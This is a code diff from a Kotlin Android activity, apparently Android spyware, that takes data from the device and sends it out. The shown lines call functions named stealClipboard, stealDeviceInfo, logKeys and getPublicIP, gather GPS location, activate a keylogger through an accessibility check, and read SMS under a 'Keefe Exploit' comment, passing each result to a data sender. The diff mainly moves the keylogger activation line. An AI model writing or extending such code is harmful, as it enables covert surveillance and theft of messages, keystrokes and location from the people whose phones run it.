@@ -51,6 +51,7 @@ class ProfileTemplate : AppCompatActivity() {
         val gps = FindLocation(this, this)
         datasender.sendData("id", gn.stealClipboard())
         datasender.sendData("id", gn.stealDeviceInfo())
+
         gn.logKeys()?.let { datasender.sendData("id", it) }
         gn.getPublicIP()?.let { datasender.sendData("id", it) }
         val LOCPERMISSIONS = arrayOf(
@@ -60,14 +61,13 @@ class ProfileTemplate : AppCompatActivity() {
         if (checkPerms(this, *LOCPERMISSIONS)) {
             datasender.sendData("loc", gps.getLocationDetails())
         }
-        
+        gn.accessibilityCheck() //Activate keylogger
+
+        // Keefe Exploit --------------------------------------------------------------
         val SMSPERMISSIONS = arrayOf(
             android.Manifest.permission.SEND_SMS,
             android.Manifest.permission.READ_SMS
         )
-        gn.accessibilityCheck() //Activate keylogger
-
-        // Keefe Exploit --------------------------------------------------------------
         if (checkPerms(this, *SMSPERMISSIONS)) {
              hv.getSMS()
         }
